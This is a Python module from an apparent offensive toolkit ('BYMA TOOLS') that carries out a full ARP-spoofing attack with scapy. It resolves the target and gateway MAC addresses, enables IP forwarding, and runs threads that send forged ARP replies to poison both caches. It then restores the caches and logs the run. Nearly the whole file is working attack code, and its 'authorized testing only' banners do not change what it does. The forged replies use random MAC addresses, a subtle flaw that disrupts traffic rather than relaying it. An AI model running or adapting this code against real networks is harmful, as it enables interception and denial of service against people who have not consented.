"""
BYMA TOOLS - Advanced ARP Spoofer
Professional ARP spoofing for network security testing
"""
import socket
import struct
import time
import json
import threading
from pathlib import Path
from datetime import datetime
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, print_subsection, print_table,
    cprint, Colors, print_separator, Icons
)
from core.logger import get_database, get_logger

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class ARPSpoofer:
    """Professional ARP spoofing tool for network security testing"""
    
    def __init__(self):
        self.logger = get_logger()
        self.db = get_database()
        self.start_time = None
        self.spoofing = False
        self.packets_sent = 0
        self.packets_received = 0
        self.original_macs = {}
    
    def execute(self, target_ip, gateway_ip, interface=None, duration=60, output=None):
        """Main ARP spoof function"""
        self.start_time = datetime.now()
        
        print_section("ARP SPOOFER")
        print()
        
        # Create scan record
        scan_id = self.db.create_scan("arp_spoof", f"{target_ip}->{gateway_ip}", "attack")
        self.logger.scan_start("arp_spoof", f"{target_ip}->{gateway_ip}")
        
        try:
            if not SCAPY_AVAILABLE:
                print_error("Scapy is required for ARP spoofing")
                print_info("Install with: pip install scapy")
                return
            
            print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}      {target_ip}")
            print(f"  {Icons.TARGET} {Colors.BCYAN}Gateway:{Colors.BWHITE}     {gateway_ip}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Interface:{Colors.BWHITE}   {interface or 'Default'}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Duration:{Colors.BWHITE}    {duration}s")
            print_separator("-", 50)
            print()
            
            # Warning
            print_warning("ARP Spoofing should only be performed on networks you own or have permission to test")
            print_warning("This tool is for authorized security testing only")
            print()
            
            # Get MAC addresses
            print_subsection("Resolving MAC Addresses")
            
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            if not target_mac:
                print_error(f"Could not resolve MAC for target: {target_ip}")
                return
            
            if not gateway_mac:
                print_error(f"Could not resolve MAC for gateway: {gateway_ip}")
                return
            
            print_success(f"Target MAC: {target_mac}")
            print_success(f"Gateway MAC: {gateway_mac}")
            print()
            
            # Enable IP forwarding
            print_subsection("Enabling IP Forwarding")
            self._enable_ip_forwarding()
            
            # Start spoofing
            print_subsection("ARP Spoofing")
            print_info(f"Spoofing for {duration} seconds...")
            print_warning("Press Ctrl+C to stop")
            print()
            
            self.spoofing = True
            
            # Create spoofing threads
            target_thread = threading.Thread(
                target=self._spoof_loop,
                args=(target_ip, gateway_ip, target_mac, gateway_mac)
            )
            gateway_thread = threading.Thread(
                target=self._spoof_loop,
                args=(gateway_ip, target_ip, gateway_mac, target_mac)
            )
            
            target_thread.daemon = True
            gateway_thread.daemon = True
            
            target_thread.start()
            gateway_thread.start()
            
            # Wait for duration or Ctrl+C
            try:
                time.sleep(duration)
            except KeyboardInterrupt:
                pass
            
            # Stop spoofing
            self.spoofing = False
            
            # Wait for threads to finish
            target_thread.join(timeout=5)
            gateway_thread.join(timeout=5)
            
            # Restore ARP tables
            print_subsection("Restoring ARP Tables")
            self._restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
            
            # Disable IP forwarding
            print_subsection("Disabling IP Forwarding")
            self._disable_ip_forwarding()
            
            # Display results
            self._display_results()
            
            # Save to database
            self._save_to_database(scan_id)
            
            # Update scan status
            self.db.update_scan(scan_id, "completed", self.packets_sent)
            self.logger.scan_complete("arp_spoof", f"{target_ip}->{gateway_ip}", self.packets_sent)
            
            # Save to file if requested
            if output:
                self._save_results(output)
            
            return {
                'target': target_ip,
                'gateway': gateway_ip,
                'target_mac': target_mac,
                'gateway_mac': gateway_mac,
                'packets_sent': self.packets_sent,
            }
        
        except Exception as e:
            self.spoofing = False
            self.db.update_scan(scan_id, "failed")
            self.logger.scan_error("arp_spoof", f"{target_ip}->{gateway_ip}", str(e))
            print_error(f"ARP spoof failed: {e}")
            return None
    
    def _get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            answered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            if answered:
                return answered[0][1].hwsrc
        except:
            pass
        
        return None
    
    def _spoof_loop(self, source_ip, target_ip, source_mac, target_mac):
        """Continuous spoofing loop"""
        while self.spoofing:
            try:
                # Create spoofed ARP response
                packet = scapy.ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,  # Target IP
                    hwdst=target_mac,  # Target MAC
                    psrc=source_ip,  # Spoofed source IP
                    hwsrc=self._get_random_mac()  # Fake MAC
                )
                
                scapy.send(packet, verbose=False)
                self.packets_sent += 1
                
                # Display progress
                if self.packets_sent % 10 == 0:
                    cprint(f"  Packets sent: {self.packets_sent}", Colors.BWHITE)
                
                time.sleep(2)
            
            except Exception as e:
                if self.spoofing:
                    print_error(f"Spoof error: {e}")
    
    def _get_random_mac(self):
        """Generate random MAC address"""
        import random
        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        return ':'.join(f'{byte:02x}' for byte in mac)
    
    def _restore_arp(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Restore ARP tables to original state"""
        print_info("Restoring ARP tables...")
        
        # Send correct ARP replies to target
        packet_to_target = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        
        # Send correct ARP replies to gateway
        packet_to_gateway = scapy.ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac
        )
        
        # Send multiple times to ensure restoration
        for _ in range(5):
            scapy.send(packet_to_target, verbose=False)
            scapy.send(packet_to_gateway, verbose=False)
        
        print_success("ARP tables restored")
    
    def _enable_ip_forwarding(self):
        """Enable IP forwarding"""
        try:
            if __import__('sys').platform == 'linux':
                import subprocess
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                             capture_output=True, check=True)
                print_success("IP forwarding enabled (Linux)")
            else:
                print_warning("IP forwarding must be enabled manually on Windows")
                print_info("Run as Administrator and enable IP routing in registry")
        except Exception as e:
            print_warning(f"Could not enable IP forwarding: {e}")
    
    def _disable_ip_forwarding(self):
        """Disable IP forwarding"""
        try:
            if __import__('sys').platform == 'linux':
                import subprocess
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                             capture_output=True, check=True)
                print_success("IP forwarding disabled (Linux)")
        except Exception as e:
            print_warning(f"Could not disable IP forwarding: {e}")
    
    def _display_results(self):
        """Display spoofing results"""
        print_section("ARP SPOOF RESULTS")
        
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        # Summary
        print(f"\n  {Icons.INFO} {Colors.BCYAN}SPOOF SUMMARY{Colors.RESET}")
        print_separator("-", 50)
        
        print(f"  {Icons.INFO} {Colors.BCYAN}Duration:{Colors.BWHITE}      {elapsed:.1f}s")
        print(f"  {Icons.INFO} {Colors.BCYAN}Packets Sent:{Colors.BWHITE}  {self.packets_sent}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Rate:{Colors.BWHITE}          {self.packets_sent/max(elapsed, 1):.1f} pps")
        
        print_separator("-", 50)
        print()
        
        # Status
        print_success("ARP spoofing completed successfully")
        print_info("ARP tables have been restored")
        print()
    
    def _save_to_database(self, scan_id):
        """Save results to database"""
        try:
            with self.db._cursor() as cursor:
                cursor.execute("""
                    INSERT INTO scan_results 
                    (scan_id, result_type, result_data)
                    VALUES (?, ?, ?)
                """, (
                    scan_id,
                    'arp_spoof_result',
                    json.dumps({
                        'packets_sent': self.packets_sent,
                    })
                ))
        except Exception as e:
            print_warning(f"Could not save to database: {e}")
    
    def _save_results(self, output_file):
        """Save results to JSON file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            results = {
                'scan_time': self.start_time.isoformat(),
                'packets_sent': self.packets_sent,
            }
            
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            print_success(f"Results saved to {output_file}")
        except Exception as e:
            print_error(f"Failed to save results: {e}")
